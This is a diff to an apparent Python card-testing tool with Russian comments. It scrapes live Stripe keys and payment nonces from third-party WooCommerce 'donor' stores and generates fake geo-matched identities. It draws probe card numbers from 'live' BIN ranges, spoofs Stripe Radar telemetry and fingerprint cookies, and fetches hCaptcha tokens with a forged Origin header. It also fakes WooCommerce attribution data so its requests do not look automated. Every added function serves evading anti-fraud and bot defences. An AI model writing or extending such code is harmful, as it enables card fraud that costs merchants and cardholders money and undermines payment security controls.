@@ -8,6 +8,7 @@ import random
 import re
 import string
 import uuid
+from datetime import datetime, timezone
 
 STRIPE_API_VERSION = "2024-06-20"
 STRIPE_JS_BUILD = "c1fbe29896"
@@ -18,6 +19,10 @@ RE_PK_LIVE = re.compile(r'pk_live_[0-9a-zA-Z]{24,}')
 RE_UPE_NONCE = re.compile(r'createAndConfirmSetupIntentNonce["\']?\s*[:=]\s*["\']([^"\']+)["\']')
 RE_LEGACY_NONCE = re.compile(r'add_card_nonce["\']?\s*[:=]\s*["\']([a-f0-9]{10})["\']')
 RE_LEGACY_NONCE_ALT = re.compile(r'createSetupIntentNonce["\']?\s*[:=]\s*["\']([^"\']+)["\']')
+# Задел под миграцию Payment Element на Confirmation Tokens (ИССЛЕДОВАНИЕ.md §8.4):
+# JS-переменная/атрибут с confirmationToken nonce + сам id ctoken_*
+RE_CTOKEN_NONCE = re.compile(r'confirmationToken(?:Nonce)?["\']?\s*[:=]\s*["\']([^"\']+)["\']')
+RE_CTOKEN_ID = re.compile(r'ctoken_[0-9A-Za-z]{20,}')
 RE_REGISTER_FORM = re.compile(r'<form[^>]*class="[^"]*register[^"]*"[^>]*>(.*?)</form>', re.S)
 RE_HIDDEN_INPUT = re.compile(r'<input[^>]*type=["\']hidden["\'][^>]*>')
 RE_INPUT_NAME = re.compile(r'name=["\']([^"\']+)["\']')
@@ -45,10 +50,39 @@ EMAIL_DOMAINS = [
     "gmail.com", "outlook.com", "yahoo.com", "hotmail.com", "icloud.com",
     "proton.me", "aol.com", "zoho.com",
 ]
-# city/state/zip выровнены по индексу — реальная гео-связка
-_CITIES = ["New York", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "Austin"]
-_STATES = ["NY", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "TX"]
-_ZIPS = ["10001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "73301"]
+# --- Гео-пулы: city/state/zip выровнены по индексу — реальная связка на страну ---
+# Формат: alpha2 -> [(city, region, zip), ...]; fallback всегда US
+GEO_POOLS: dict[str, list[tuple[str, str, str]]] = {
+    "US": [
+        ("New York", "NY", "10001"), ("Chicago", "IL", "60601"), ("Houston", "TX", "77001"),
+        ("Phoenix", "AZ", "85001"), ("Philadelphia", "PA", "19101"), ("San Antonio", "TX", "78201"),
+        ("San Diego", "CA", "92101"), ("Dallas", "TX", "75201"), ("Austin", "TX", "73301"),
+    ],
+    "GB": [("London", "England", "SW1A 1AA"), ("Manchester", "England", "M1 1AA"),
+           ("Birmingham", "England", "B1 1AA")],
+    "AU": [("Sydney", "NSW", "2000"), ("Melbourne", "VIC", "3000"), ("Brisbane", "QLD", "4000")],
+    "CA": [("Toronto", "ON", "M5H 2N2"), ("Vancouver", "BC", "V6B 1A1"), ("Montreal", "QC", "H3A 1A1")],
+    "DE": [("Berlin", "BE", "10115"), ("Munich", "BY", "80331"), ("Hamburg", "HH", "20095")],
+    "FR": [("Paris", "IDF", "75001"), ("Lyon", "ARA", "69001"), ("Marseille", "PAC", "13001")],
+}
+_CITIES = [c for c, _, _ in GEO_POOLS["US"]]
+_STATES = [s for _, s, _ in GEO_POOLS["US"]]
+_ZIPS = [z for _, _, z in GEO_POOLS["US"]]
+
+_STREETS = ["Main", "Oak", "Maple", "Cedar", "Park", "Lake", "Hill", "Church"]
+
+
+def geo_identity_fields(country_code: str = "US") -> dict:
+    """Случайный адрес из пула страны; неизвестная страна → US."""
+    pool = GEO_POOLS.get((country_code or "US").upper(), GEO_POOLS["US"])
+    city, state, zc = random.choice(pool)
+    return {
+        "line1": f"{random.randint(100, 9999)} {random.choice(_STREETS)} Street",
+        "city": city,
+        "state": state,
+        "postal_code": zc,
+        "country": (country_code or "US").upper() if country_code in GEO_POOLS else "US",
+    }
 
 # BIN-пулы пробников: живые диапазоны MC/VISA, 16 цифр
 _PROBE_BINS = ["517546", "558874", "542251", "453927", "491767", "448528", "530672", "455951"]
@@ -173,8 +207,8 @@ def polite_delay(base: float = 1.2, spread: float = 1.3):
     return asyncio.sleep(random.uniform(base, base + spread))
 
 
-def random_identity() -> dict:
-    idx = random.randrange(len(_CITIES))
+def random_identity(country_code: str = "US") -> dict:
+    geo = geo_identity_fields(country_code)
     first = random.choice(FIRST_NAMES)
     last = random.choice(LAST_NAMES)
     return {
@@ -184,11 +218,7 @@ def random_identity() -> dict:
         "email": f"{first.lower()}.{rand_str(7)}@{random.choice(EMAIL_DOMAINS)}",
         "username": f"{first.lower()}_{rand_str(6)}",
         "password": f"S{rand_str(10)}!{random.randint(2, 9)}aA",
-        "line1": f"{random.randint(100, 9999)} {random.choice(['Main', 'Oak', 'Maple', 'Cedar', 'Park', 'Lake'])} Street",
-        "city": _CITIES[idx],
-        "state": _STATES[idx],
-        "postal_code": _ZIPS[idx],
-        "country": "US",
+        **geo,
     }
 
 
@@ -222,7 +252,7 @@ def extract_register_form_html(page_html: str) -> str:
 
 
 def scrape_gate(pm_html: str) -> dict:
-    """pk_live + оба варианта SetupIntent nonce со страницы add-payment-method."""
+    """pk_live + все варианты SetupIntent/ConfirmationToken nonce со страницы add-payment-method."""
     pk = extract_pk_live(pm_html)
     upe_m = RE_UPE_NONCE.search(pm_html)
     legacy_m = RE_LEGACY_NONCE.search(pm_html)
@@ -231,29 +261,139 @@ def scrape_gate(pm_html: str) -> dict:
         alt_m = RE_LEGACY_NONCE_ALT.search(pm_html)
         if alt_m:
             legacy = alt_m.group(1)
+    ctoken_m = RE_CTOKEN_NONCE.search(pm_html)
+    ctoken_id_m = RE_CTOKEN_ID.search(pm_html)
     return {
         "pk": pk,
         "upe_nonce": upe_m.group(1) if upe_m else "",
         "legacy_nonce": legacy,
+        "ctoken_nonce": ctoken_m.group(1) if ctoken_m else "",
+        "ctoken_id": ctoken_id_m.group(0) if ctoken_id_m else "",
     }
 
 
-def stripe_telemetry(base_url: str, pk: str) -> dict:
-    """Radar Telemetry v2021 — payment-element, deferred-intent, полный набор attribution."""
-    idx = random.randrange(len(_CITIES))
+def parse_stripe_cookies(set_cookie_headers: list[str] | None) -> dict:
+    """__stripe_mid/__stripe_sid из Set-Cookie ответа m.stripe.com/6.
+    Возвращает {"mid": ..., "sid": ...} — отсутствующие ключи пустые."""
+    out = {"mid": "", "sid": ""}
+    for raw in set_cookie_headers or []:
+        for part in str(raw).split(";"):
+            name, _, value = part.strip().partition("=")
+            if name == "__stripe_mid" and not out["mid"]:
+                out["mid"] = value.strip()
+            elif name == "__stripe_sid" and not out["sid"]:
+                out["sid"] = value.strip()
+    return out
+
+
+def m_stripe_beacon_payload() -> dict:
+    """Тело beacon-POST к m.stripe.com/6 (пустая форма тоже валидна — сервер минтует сам)."""
+    return {"v": "t", "url": "", "lsid": str(uuid.uuid4()),
+            "guid": str(uuid.uuid4()), "muid": str(uuid.uuid4())}
+
+
+def parse_m_stripe_response(data: dict) -> dict:
+    """Серверные fingerprint-токены из JSON-ответа m.stripe.com/6 (POST).
+    Формат значений: <uuid><6 hex> — живые Radar-идентификаторы сессии."""
+    out = {"muid": "", "sid": "", "guid": ""}
+    if isinstance(data, dict):
+        for k in out:
+            v = data.get(k)
+            if isinstance(v, str) and len(v) >= 20:
+                out[k] = v
+    return out
+
+
+async def fetch_hcaptcha_radar_token(session, pk: str, donor_host: str) -> str | None:
+    """hcaptcha_token для radar_options (мимикрия stripecc1 шаг 4-5):
+    wallet-config отдаёт sitekey → checksiteconfig отдаёт P1_-токен.
+    Любой сбой → None, вызывающий шлёт тело без токена."""
+    try:
+        r = await session.post(
+            "https://merchant-ui-api.stripe.com/elements/wallet-config",
+            data={
+                "stripe_js_id": str(uuid.uuid4()),
+                "referrer_host": donor_host.replace("https://", "").replace("http://", ""),
+                "key": pk,
+                "request_surface": "web_split_card_element_popup",
+            },
+            # Origin обязан быть js.stripe.com (мерчантский origin → 403 invalid_request_http_origin),
+            # Referer — живая страница донора, где элементы рендерятся
+            headers={"Origin": "https://js.stripe.com",
+                     "Referer": f"https://{donor_host.replace('https://', '').replace('http://', '')}/my-account/add-payment-method/",
+                     "Accept": "application/json"},
+            timeout=8,
+        )
+        sitekey = _find_key(r.json(), "link_hcaptcha_site_key") or ""
+        if not sitekey:
+            return None
+        r2 = await session.post(
+            "https://api.hcaptcha.com/checksiteconfig",
+            params={"v": STRIPE_JS_BUILD, "sitekey": sitekey,
+                    "host": "b.stripecdn.com", "sc": "1", "swa": "1"},
+            headers={"Origin": "https://b.stripecdn.com", "Referer": "https://b.stripecdn.com/",
+                     "Accept": "application/json"},
+            timeout=8,
+        )
+        req_tok = (_find_key(r2.json(), "req") or "")
+        if not req_tok:
+            return None
+        return req_tok if req_tok.startswith("P1_") else f"P1_{req_tok}"
+    except Exception:
+        return None
+
+
+def _find_key(obj, key: str):
+    """Рекурсивный поиск значения по ключу в JSON-ответе любой вложенности."""
+    if isinstance(obj, dict):
+        if key in obj and isinstance(obj[key], str) and obj[key]:
+            return obj[key]
+        for v in obj.values():
+            hit = _find_key(v, key)
+            if hit:
+                return hit
+    elif isinstance(obj, list):
+        for v in obj:
+            hit = _find_key(v, key)
+            if hit:
+                return hit
+    return None
+
+
+def wc_attribution_fields(donor_url: str) -> dict:
+    """wc_order_attribution_* — копия аналитики WooCommerce (мимикрия MeduzaVIP).
+    Без этих полей запрос выглядит ботом для плагинов, следящих за UTM."""
+    base = donor_url.rstrip("/")
+    return {
+        "wc_order_attribution_source_type": "organic",
+        "wc_order_attribution_referrer": "https://www.google.com/",
+        "wc_order_attribution_utm_campaign": "(none)",
+        "wc_order_attribution_utm_source": "(direct)",
+        "wc_order_attribution_utm_medium": "(none)",
+        "wc_order_attribution_utm_content": "(none)",
+        "wc_order_attribution_utm_term": "(none)",
+        "wc_order_attribution_session_entry": f"{base}/my-account/add-payment-method/",
+        "wc_order_attribution_session_start_time": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S"),
+        "wc_order_attribution_session_pages": "2",
+        "wc_order_attribution_session_count": "1",
+    }
+
+
+def stripe_telemetry(base_url: str, pk: str, country_code: str = "US",
+                     muid: str = "", sid: str = "") -> dict:
+    """Radar Telemetry v2021 — payment-element, deferred-intent, полный набор attribution.
+    muid/sid: живые значения из Set-Cookie m.stripe.com/6 (parse_stripe_cookies);
+    пустые → uuid4 fallback. guid остаётся uuid4 всегда (per-pageload)."""
+    geo = geo_identity_fields(country_code)
     first = random.choice(FIRST_NAMES)
     last = random.choice(LAST_NAMES)
     return {
-        "muid": str(uuid.uuid4()),
-        "sid": str(uuid.uuid4()),
+        "muid": muid or str(uuid.uuid4()),
+        "sid": sid or str(uuid.uuid4()),
         "guid": str(uuid.uuid4()),
         "time_on_page": str(random.randint(18400, 48900)),
         "name": f"{first} {last}",
-        "line1": f"{random.randint(100, 9999)} {random.choice(['Main', 'Oak', 'Maple', 'Cedar'])} Street",
-        "city": _CITIES[idx],
-        "state": _STATES[idx],
-        "postal_code": _ZIPS[idx],
-        "country": "US",
+        **geo,
         "client_session_id": f"src_{rand_str(24)}",
         "elements_session_config_id": f"src_{rand_str(24)}",
         "payment_user_agent": f"stripe.js/{STRIPE_JS_BUILD}; stripe-js-v3/{STRIPE_JS_BUILD}; payment-element; deferred-intent",
@@ -263,10 +403,10 @@ def stripe_telemetry(base_url: str, pk: str) -> dict:
 
 
 def tokenize_body(card: dict, telem: dict, referrer: str) -> dict:
-    return {
+    body = {
         "type": "card",
         "billing_details[name]": telem["name"],
-        "billing_details[address][line1]": telem["line1"],
+        "billing_details[address][line1]": telem.get("line1", ""),
         "billing_details[address][city]": telem["city"],
         "billing_details[address][state]": telem["state"],
         "billing_details[address][postal_code]": telem["postal_code"],
@@ -294,6 +434,11 @@ def tokenize_body(card: dict, telem: dict, referrer: str) -> dict:
         "key": telem["key"],
         "_stripe_version": telem["_stripe_version"],
     }
+    # radar_options[hcaptcha_token] — только когда токен реально добыт (stripecc1-мимикрия)
+    hc = telem.get("_hcaptcha_token")
+    if hc:
+        body["radar_options[hcaptcha_token]"] = hc
+    return body
 
 
 TOKENIZE_HEADERS = {
